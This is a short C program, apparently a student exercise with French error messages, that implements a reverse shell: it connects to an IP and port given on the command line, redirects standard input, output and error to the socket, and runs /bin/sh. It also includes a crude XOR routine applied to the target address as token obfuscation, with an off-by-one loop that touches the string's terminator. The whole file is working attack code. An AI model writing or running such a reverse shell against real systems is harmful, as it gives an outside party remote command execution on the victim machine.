#include "shell.h"

void	applyXor(char *data, char key, int length)
{
	int	i;

	i = 0;
	while (i <= length)
	{
		data[i] = data[i] ^ key;
		i++;
	}
}

int	main(int argc, char **argv)
{
	struct sockaddr_in	serverAddress;
	char				*target;
	char				key = 0x2A;
	int					clientSocket;
	int					len;
	int					port;
	char				*args[] = {"/bin/sh", NULL};

	if (argc != 3)
	{
		printf("Usage: %s <ip> <port>\n", argv[0]);
		return (1);
	}

	target = argv[1];
	port = atoi(argv[2]);

	len = strlen(target);

	applyXor(target, key, len);

	clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket < 0)
		return (1);

	serverAddress.sin_family = AF_INET;
	serverAddress.sin_port = htons(port);

	applyXor(target, key, len);

	if (inet_pton(AF_INET, target, &serverAddress.sin_addr) <= 0)
	{
		printf("Adresse invalide ou non supportée\n");
		close(clientSocket);
		return (1);
	}

	applyXor(target, key, len);

	if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0)
	{
		printf("Échec de la connexion au serveur (est-il bien lancé ?)\n");
		close(clientSocket);
		return (1);
	}
	if (dup2(clientSocket, STDIN_FILENO) == -1)
	{
		perror("dup2 stdin");
		return (1);
	}
	if (dup2(clientSocket, STDOUT_FILENO) == -1)
	{
		perror("dup2 stdout");
		return (1);
	}
	if (dup2(clientSocket, STDERR_FILENO) == -1)
	{
		perror("dup2 stderr");
		return (1);
	}

	execve("/bin/sh", args, NULL);

	perror("execve");
	return (1);
}
